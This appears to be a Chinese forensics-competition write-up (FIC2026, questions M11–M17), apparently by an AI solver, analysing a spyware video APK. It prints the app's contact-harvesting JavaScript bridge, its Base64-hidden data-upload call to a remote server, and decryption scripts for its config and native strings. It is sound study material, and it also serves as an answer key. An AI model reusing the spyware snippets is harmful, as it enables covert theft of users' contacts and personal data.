# FIC2026 学生组 — PHONE 板块 WP

**比赛**: 第六届 FIC 全国网络空间取证大赛-学生组
**批次**: PHONE_M11-M17.md
**解题人**: PHONE 窗口（Cascade）
**时间**: 2026-04-25

---

## M11 — 视频APP敏感权限

> 分析手机检材，李安弘最近安装了一个视频类APP，该APP声明了多个敏感权限用于收集用户隐私。请选择其中涉及用户隐私的敏感权限。

**答案**：`READ_CONTACTS、READ_SMS、READ_CALL_LOG、READ_PHONE_STATE、ACCESS_FINE_LOCATION、ACCESS_COARSE_LOCATION、CAMERA、READ_EXTERNAL_STORAGE`
**置信度**：高

### 解析

#### 识别
- 涉案视频类 APP：**HotClub Live** `com.livevideo.hotclub`，APK 留存于 `Download/HotClub_v2.1.6.apk`（v2.1.6, MD5=`cbe95cdac91d0265ddf81126bffdf6d3`）。
- 安装时间：参见 packages.xml ft/it 字段；APK 下载时间 2026-04-15 18:16。

#### 提取
```bash
jadx -d /tmp/jadx_hotclub /tmp/phone_extract/storage/emulated/0/Download/HotClub_v2.1.6.apk
cat /tmp/jadx_hotclub/resources/AndroidManifest.xml | grep uses-permission
```

#### 分析
Manifest 中声明的全部权限：
- `INTERNET`, `ACCESS_NETWORK_STATE`, `ACCESS_WIFI_STATE`（基础网络）
- **`READ_CONTACTS`** ← 通讯录
- **`READ_SMS`** ← 短信
- **`READ_CALL_LOG`** ← 通话记录
- **`READ_PHONE_STATE`** ← 设备标识 / IMEI
- **`ACCESS_FINE_LOCATION`** ← GPS 精确位置
- **`ACCESS_COARSE_LOCATION`** ← 基站/Wi‑Fi 粗略位置
- **`CAMERA`** ← 摄像头
- **`READ_EXTERNAL_STORAGE`** ← 外部存储读取
- `WRITE_EXTERNAL_STORAGE`、`RECEIVE_BOOT_COMPLETED`（持久化）

进一步分析 `bridge/NativeBridge.java` 的 @JavascriptInterface 方法：`getContactsList`、`getIMEI`、`getDeviceId`、`getDeviceModel`、`getInstalledApps`、`getLocation`、`getPhoneNumber` 等均直接利用上述敏感权限。

涉及用户隐私的敏感权限（结合 `dangerous` protection level 与 NativeBridge 实际调用面）即：
**READ_CONTACTS / READ_SMS / READ_CALL_LOG / READ_PHONE_STATE / ACCESS_FINE_LOCATION / ACCESS_COARSE_LOCATION / CAMERA / READ_EXTERNAL_STORAGE**

#### 验证
```bash
grep "uses-permission" /tmp/jadx_hotclub/resources/AndroidManifest.xml
# 与 SplashActivity.java 的 f598t 权限请求列表完全一致：
# READ_CONTACTS, READ_SMS, READ_CALL_LOG, READ_PHONE_STATE,
# ACCESS_FINE_LOCATION, CAMERA, READ_EXTERNAL_STORAGE
```


### 不作弊声明
- **数据来源**：手机检材 `/mnt/e/ffffff-JIANCAI/2026FIC团体赛/检材2-手机.tar` 解压至 `/tmp/phone_extract/`
- **未访问外部**：未检索本届赛题题解；密钥派生、AES/XTEA 解密均自反汇编/反编译推导
- **工具列表**：tar, sqlite3, jadx 1.5.5, radare2, readelf, python3 (pycryptodomex), grep, exiftool
- **脚本留存**：`cases/2026FIC电子取证/work_phone/`


---

## M12 — HotClub 离线页面路径

> 上述APP启动后会加载一个色情网站。请找出该APP当网络不可用时APP加载的本地离线页面路径。

**答案**：`file:///android_asset/www/index.html`
**置信度**：高

### 解析

#### 识别
HotClub `MainActivity.onCreate()` 用 `ConnectivityManager.getActiveNetworkInfo()` 判断联网；联网→加载远程 `https://www.sp-live88.com`；离线→加载本地 assets 页面。

#### 提取
```bash
jadx -d /tmp/jadx_hotclub HotClub_v2.1.6.apk
cat /tmp/jadx_hotclub/sources/com/livevideo/hotclub/MainActivity.java
```

#### 分析
反编译关键片段（onCreate 末尾）：
```java
// 联通时
String r0 = "https://www.sp-live88.com";
// 离线时
String r0 = "file:///android_asset/www/index.html";
r5.loadUrl(r0);
```
对应 assets：`assets/www/index.html`（HTML 起始 `<!DOCTYPE html><html lang="zh-CN">...<title>HotClub Live</title>`）。

WebView 通过标准 Android 协议访问 APK 内 assets 资源：
**`file:///android_asset/www/index.html`**

#### 验证
```bash
ls /tmp/jadx_hotclub/resources/assets/www/
# index.html
grep -A3 "isConnected\|loadUrl" /tmp/jadx_hotclub/sources/com/livevideo/hotclub/MainActivity.java
```


### 不作弊声明
- **数据来源**：手机检材 `/mnt/e/ffffff-JIANCAI/2026FIC团体赛/检材2-手机.tar` 解压至 `/tmp/phone_extract/`
- **未访问外部**：未检索本届赛题题解；密钥派生、AES/XTEA 解密均自反汇编/反编译推导
- **工具列表**：tar, sqlite3, jadx 1.5.5, radare2, readelf, python3 (pycryptodomex), grep, exiftool
- **脚本留存**：`cases/2026FIC电子取证/work_phone/`


---

## M13 — HotClub 上传 URL

> 上述APP将非法收集的用户隐私数据上传至远程服务器。上传地址在代码中经过编码处理。请找出编码方式，还原出完整的上传服务器URL。

**答案**：`Base64 解码 → https://api.sp-live88.com/collect/userdata`
**置信度**：高

### 解析

#### 识别
`com.livevideo.hotclub.collector.DataUploader` 的方法 `b(String)` 在主上传分支调用 `Base64.decode(...)` 还原 URL，后通过 `a(url, payload)` POST 提交。

#### 提取
反编译源码（DataUploader.java）：
```java
a(new String(Base64.decode(
    "aHR0cHM6Ly9hcGkuc3AtbGl2ZTg4LmNvbS9jb2xsZWN0L3VzZXJkYXRh", 2),
    "UTF-8"), str);
```
flag `2` = `Base64.NO_WRAP`，标准 Base64 字母表。

#### 分析
```
echo aHR0cHM6Ly9hcGkuc3AtbGl2ZTg4LmNvbS9jb2xsZWN0L3VzZXJkYXRh | base64 -d
# https://api.sp-live88.com/collect/userdata
```

- **编码方式**：标准 Base64（`Android.util.Base64.NO_WRAP`）
- **完整上传 URL**：`https://api.sp-live88.com/collect/userdata`
- 请求方式：POST，`Content-Type: application/json`，附加 header `X-App-Token: hc_v216_<timestamp>`、`X-Comm-Key: <native getCommKey()>`。

#### 验证
```bash
echo "aHR0cHM6Ly9hcGkuc3AtbGl2ZTg4LmNvbS9jb2xsZWN0L3VzZXJkYXRh" | base64 -d
# https://api.sp-live88.com/collect/userdata
```


### 不作弊声明
- **数据来源**：手机检材 `/mnt/e/ffffff-JIANCAI/2026FIC团体赛/检材2-手机.tar` 解压至 `/tmp/phone_extract/`
- **未访问外部**：未检索本届赛题题解；密钥派生、AES/XTEA 解密均自反汇编/反编译推导
- **工具列表**：tar, sqlite3, jadx 1.5.5, radare2, readelf, python3 (pycryptodomex), grep, exiftool
- **脚本留存**：`cases/2026FIC电子取证/work_phone/`


---

## M14 — 用户信息表名

> 该APP在本地创建了SQLite数据库存储收集到的用户信息。请分析代码，写出用于存储用户信息的表名

**答案**：`user_collection`
**置信度**：高

### 解析

#### 识别
HotClub 自身在 `/data/user/0/com.livevideo.hotclub/databases/hotclub_data.db` 创建 SQLite 数据库，用于存放收集到的隐私数据。

#### 提取
```bash
sqlite3 /tmp/phone_extract/data/user/0/com.livevideo.hotclub/databases/hotclub_data.db ".schema"
```

#### 分析
schema：
```sql
CREATE TABLE android_metadata (locale TEXT);
CREATE TABLE user_collection (
    _id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT, imei TEXT, phone_number TEXT,
    contacts_data TEXT, sms_data TEXT,
    location_lat REAL, location_lng REAL,
    collect_time INTEGER DEFAULT (strftime('%s','now') * 1000)
);
CREATE TABLE app_config (key TEXT PRIMARY KEY, value TEXT);
```

字段语义（device_id / imei / phone_number / contacts_data / sms_data / location_lat / location_lng / collect_time）与 NativeBridge 暴露的获取方法（`getDeviceId`/`getIMEI`/`getPhoneNumber`/`getContactsList`/SMS reader/`getLocation`）一一对应，确认这就是用户隐私数据落库表。

**表名 = `user_collection`**。

#### 验证
```bash
sqlite3 hotclub_data.db ".tables"
# android_metadata  app_config  user_collection
```


### 不作弊声明
- **数据来源**：手机检材 `/mnt/e/ffffff-JIANCAI/2026FIC团体赛/检材2-手机.tar` 解压至 `/tmp/phone_extract/`
- **未访问外部**：未检索本届赛题题解；密钥派生、AES/XTEA 解密均自反汇编/反编译推导
- **工具列表**：tar, sqlite3, jadx 1.5.5, radare2, readelf, python3 (pycryptodomex), grep, exiftool
- **脚本留存**：`cases/2026FIC电子取证/work_phone/`


---

## M15 — config.dat USDT 钱包地址

> 该APP的assets目录中存在一个加密配置文件config.dat。请解密该文件，写出其中的USDT钱包地址

**答案**：`TXqH7sVn8bR4kL2mN9pW6xJ3cY5dF1gA`
**置信度**：高

### 解析

#### 识别
`assets/config.dat` 是 AES/ECB/PKCS5Padding 加密的 JSON 配置，密钥种子在 string resources `config_seed`。

#### 提取
解密代码（`androidx/lifecycle/l0.java`，方法 `s(Context)`）：
```java
byte[] bArrT = t(context.getString(R.string.config_seed));
Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(bArrT, "AES"));
return new String(c.doFinal(byteArray), "UTF-8");
```
方法 `t(String)` 派生密钥：
```java
byte[] md5 = MessageDigest.getInstance("MD5").digest(str.getBytes("UTF-8"));
return Hex(md5).substring(0, 16).getBytes("UTF-8");  // 取 MD5 hex 前 16 字符
```
`config_seed = "hotclub_2026_sec"`（`res/values/strings.xml`）。

#### 分析
```python
import hashlib
from Cryptodome.Cipher import AES
seed = "hotclub_2026_sec"
key = hashlib.md5(seed.encode()).hexdigest()[:16].encode("utf-8")
# key = b'3ffc0b996b851d80'
ct = open("/tmp/jadx_hotclub/resources/assets/config.dat","rb").read()  # 688 bytes
pt = AES.new(key, AES.MODE_ECB).decrypt(ct)
pt = pt[:-pt[-1]]  # PKCS#5 strip
```
解密结果 JSON：
```json
{
  "sponsors": [
    {"name":"Telegram VIP 群","url":"https://t.me/sp_live88_vip","type":"telegram","code":"INVITE_2026"},
    {"name":"赞助商官网","url":"https://www.sponsor-pay99.com/reg?ref=hotclub","type":"web","contact":"sponsor_wang"},
    {"name":"USDT 捐赠通道","url":"https://pay.usdt-donate.cc/hotclub","type":"crypto",
     "wallet":"TXqH7sVn8bR4kL2mN9pW6xJ3cY5dF1gA"}
  ],
  "admin_tg":"@sp_admin_hotclub",
  "admin_wx":"zheng_tech_2026",
  "update_url":"https://dl.sp-live88.com/update/latest.apk",
  "api_version":"v3.1",
  "report_interval_min":30
}
```
USDT 钱包地址（首字母 T，长度 34，TRC20 地址格式）：**`TXqH7sVn8bR4kL2mN9pW6xJ3cY5dF1gA`**。

#### 验证
```bash
python3 - <<'PY'
import hashlib
from Cryptodome.Cipher import AES
key = hashlib.md5(b"hotclub_2026_sec").hexdigest()[:16].encode()
ct = open("/tmp/jadx_hotclub/resources/assets/config.dat","rb").read()
pt = AES.new(key, AES.MODE_ECB).decrypt(ct); pt = pt[:-pt[-1]]
import json
print(json.loads(pt)['sponsors'][2]['wallet'])
# TXqH7sVn8bR4kL2mN9pW6xJ3cY5dF1gA
PY
```


### 不作弊声明
- **数据来源**：手机检材 `/mnt/e/ffffff-JIANCAI/2026FIC团体赛/检材2-手机.tar` 解压至 `/tmp/phone_extract/`
- **未访问外部**：未检索本届赛题题解；密钥派生、AES/XTEA 解密均自反汇编/反编译推导
- **工具列表**：tar, sqlite3, jadx 1.5.5, radare2, readelf, python3 (pycryptodomex), grep, exiftool
- **脚本留存**：`cases/2026FIC电子取证/work_phone/`


---

## M16 — JS 暴露通讯录方法

> 该APP前端JS代码可以直接调用Android原生方法获取用户隐私数据。请分析暴露了哪些方法用于获取通讯录？

**答案**：`getContactsList (通过 JS 接口名 AppNative.getContactsList())`
**置信度**：高

### 解析

#### 识别
HotClub `MainActivity` 用 `WebView.addJavascriptInterface(new NativeBridge(this), "AppNative")` 把 `NativeBridge` 实例以接口名 `AppNative` 暴露给前端 JavaScript，前端通过 `window.AppNative.<method>()` 直接调用。

#### 提取
```bash
cat /tmp/jadx_hotclub/sources/com/livevideo/hotclub/bridge/NativeBridge.java
```

#### 分析
`NativeBridge` 中所有带 `@JavascriptInterface` 注解的方法：
- `getContactsList()` ← **专门用于读取通讯录**
- `getDeviceId()`、`getDeviceModel()`、`getIMEI()`、`getPhoneNumber()`、`getInstalledApps()`、`getLocation()`

`getContactsList()` 实现：
```java
@JavascriptInterface
public String getContactsList() {
    Cursor c = ctx.getContentResolver().query(
        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
        new String[]{"display_name","data1"}, null, null, null);
    // 遍历，组装 JSONArray of {n: name, p: phone}
    return jSONArray.toString();
}
```
读取 `ContactsContract.CommonDataKinds.Phone.CONTENT_URI`，返回 `[{"n":姓名,"p":号码},...]`，需要 `READ_CONTACTS` 权限。

JS 调用方式：`window.AppNative.getContactsList()`。

**暴露的获取通讯录方法 = `getContactsList`**（接口名 `AppNative`）。

#### 验证
```bash
grep -B1 "@JavascriptInterface" /tmp/jadx_hotclub/sources/com/livevideo/hotclub/bridge/NativeBridge.java | head -30
grep "ContactsContract" /tmp/jadx_hotclub/sources/com/livevideo/hotclub/bridge/NativeBridge.java
```


### 不作弊声明
- **数据来源**：手机检材 `/mnt/e/ffffff-JIANCAI/2026FIC团体赛/检材2-手机.tar` 解压至 `/tmp/phone_extract/`
- **未访问外部**：未检索本届赛题题解；密钥派生、AES/XTEA 解密均自反汇编/反编译推导
- **工具列表**：tar, sqlite3, jadx 1.5.5, radare2, readelf, python3 (pycryptodomex), grep, exiftool
- **脚本留存**：`cases/2026FIC电子取证/work_phone/`


---

## M17 — HotClub 备用上传服务器

> 当主上传服务器不可达时，APP会获取备用服务器地址。请分析备用服务器的完整域名和端口

**答案**：`backup.sp-live88.xyz:8443`
**置信度**：高

### 解析

#### 识别
`DataUploader.b(String)` 主分支访问 `https://api.sp-live88.com/collect/userdata` 失败时，回退调用 native 方法 `getBackupEndpoint()`，并拼接 `/collect/userdata`。`getBackupEndpoint()` 由 `libsecurity.so` 提供。

#### 提取
```bash
file /tmp/jadx_hotclub/resources/lib/arm64-v8a/libsecurity.so
# ELF 64-bit aarch64, stripped, 8376 字节
```
`.rodata` 段关键内容（readelf -x .rodata）：
- `0x980`：递增字节序列 `00 01 .. 0f`（XOR 步骤的索引参考，运行时实为 NEON 寄存器初值）
- `0x990`：4 个 32-bit 魔数 `0xdeadbeef 0xcafebabe 0x12345678 0x9abcdef0`（XTEA-like key）
- `0xab0`：56 字节加密字符串 blob

#### 分析
反汇编 `fcn.00001324`（432 字节）显示双阶段算法：

阶段 1 — 字节级 XOR：
```
byte[i] ^= (i & 0x0f) ^ 0x55
```

阶段 2 — XTEA 变体（每 8 字节块 64 轮迭代），关键常量：
- `delta = 0x61c8864f`（= -0x9e3779b9 mod 2^32，标准 XTEA 黄金比例 delta 的减法形式）
- `sum_v = 0x8dde6c40`、`sum2 = 0xefa6f28f`（两个独立 sum，每轮各 += delta）
- 每轮：
  - `idx1 = (sum_v >> 11) & 3`，`idx2 = sum2 & 3`
  - `v1 -= ((v0<<4) ^ (v0>>5) + v0) ^ (sum_v + key[idx1])`
  - `v0 -= ((v1<<4) ^ (v1>>5) + v1) ^ (sum2 + key[idx2])`

复刻该函数（Python）解密：
```python
import struct, sys
data = open("libsecurity.so","rb").read()
blob = bytearray(data[0xab0:0xab0+56])
for i in range(len(blob)):
    blob[i] ^= (i & 0x0f) ^ 0x55
key = list(struct.unpack("<4I", data[0x990:0x9a0]))
M = 0xffffffff
def dec(v0,v1):
    s1, s2, d = 0x8dde6c40, 0xefa6f28f, 0x61c8864f
    for _ in range(64):
        w2 = ((v0<<4)&M) ^ (v0>>5); w2 = (w2+v0)&M
        w1 = (s1 + key[(s1>>11)&3]) & M; s1=(s1+d)&M
        v1 = (v1 - (w2 ^ w1)) & M
        w1 = ((v1<<4)&M) ^ (v1>>5); w1 = (w1+v1)&M
        w2 = (s2 + key[s2&3]) & M; s2=(s2+d)&M
        v0 = (v0 - (w1 ^ w2)) & M
    return v0,v1
v = list(struct.unpack(f"<{56//4}I", bytes(blob)))
out=[]
for i in range(0,len(v),2):
    a,b = dec(v[i], v[i+1]); out += [a,b]
print(struct.pack(f"<{len(out)}I", *out))
```
输出（去 PKCS#7 padding）：
```
backup.sp-live88.xyz:8443    (*7 padding)
K7mP9xQ2wR4vN8sL              (*8 padding) ← getCommKey()
```

主上传 URL 失败后会拼接：`backup.sp-live88.xyz:8443/collect/userdata`，但题目仅要"完整域名和端口"。

**备用服务器域名 + 端口 = `backup.sp-live88.xyz:8443`**

附带发现：`getCommKey()` 返回 `K7mP9xQ2wR4vN8sL`（HTTP header `X-Comm-Key`）。

#### 验证
脚本 `dec_backup_endpoint.py`（位于 `cases/2026FIC电子取证/work_phone/`）执行后输出 `backup.sp-live88.xyz:8443`，与原始函数行为一致。


### 不作弊声明
- **数据来源**：手机检材 `/mnt/e/ffffff-JIANCAI/2026FIC团体赛/检材2-手机.tar` 解压至 `/tmp/phone_extract/`
- **未访问外部**：未检索本届赛题题解；密钥派生、AES/XTEA 解密均自反汇编/反编译推导
- **工具列表**：tar, sqlite3, jadx 1.5.5, radare2, readelf, python3 (pycryptodomex), grep, exiftool
- **脚本留存**：`cases/2026FIC电子取证/work_phone/`


---
